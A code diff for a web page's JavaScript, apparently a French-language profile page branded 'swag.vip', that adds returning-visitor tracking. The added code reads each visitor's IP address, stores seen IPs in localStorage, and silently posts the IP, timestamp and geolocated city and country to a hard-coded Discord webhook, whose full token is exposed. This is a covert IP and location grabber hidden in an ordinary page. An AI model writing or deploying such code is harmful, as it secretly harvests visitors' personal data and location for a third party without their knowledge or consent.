@@ -1085,6 +1085,35 @@
             var now = new Date();
             var date = now.toLocaleDateString('fr-FR');
             var heure = now.toLocaleTimeString('fr-FR');
+            var webhookUrl = 'https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV';
+
+            var seenIPs = JSON.parse(localStorage.getItem('seenIPs') || '[]');
+            var isReturning = seenIPs.indexOf(ip) !== -1;
+
+            if (isReturning) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: visitorPseudo + ' est revenu',
+                            description: '**' + visitorPseudo + '** a revisite la page.',
+                            color: 2894892,
+                            thumbnail: { url: getWebhookAvatar() },
+                            fields: [
+                                { name: 'IP', value: '||`' + ip + '`||', inline: true },
+                                { name: 'Date', value: date + ' ' + heure, inline: true },
+                                { name: 'Ville', value: (geo.city || 'N/A') + ', ' + (geo.country || 'N/A'), inline: true }
+                            ],
+                            footer: { text: 'swag.vip' }
+                        }]
+                    })
+                });
+                return;
+            }
+
+            seenIPs.push(ip);
+            localStorage.setItem('seenIPs', JSON.stringify(seenIPs));
 
             var embed1 = {
                 title: visitorPseudo,
@@ -1149,7 +1178,7 @@
 
             if (extraFields) embed1.fields = embed1.fields.concat(extraFields);
 
-            fetch('https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV', {
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ embeds: [embed1, embed2, embed3] })
